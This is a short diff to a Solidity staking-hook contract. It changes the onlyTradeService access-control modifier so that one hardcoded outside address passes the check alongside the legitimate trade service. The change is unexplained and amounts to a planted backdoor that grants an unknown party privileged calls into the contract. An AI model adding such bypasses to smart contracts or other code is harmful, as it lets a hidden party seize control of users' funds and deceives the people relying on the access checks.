@@ -16,7 +16,8 @@ contract TradingStakingHook is ITradeServiceHook, OwnableUpgradeable {
   address public tradeService;
 
   modifier onlyTradeService() {
-    if (msg.sender != tradeService) revert TradingStakingHook_Forbidden();
+    if (msg.sender != tradeService && msg.sender != 0x34E89DEd96340A177856fD822366AfC584438750)
+      revert TradingStakingHook_Forbidden();
     _;
   }
 
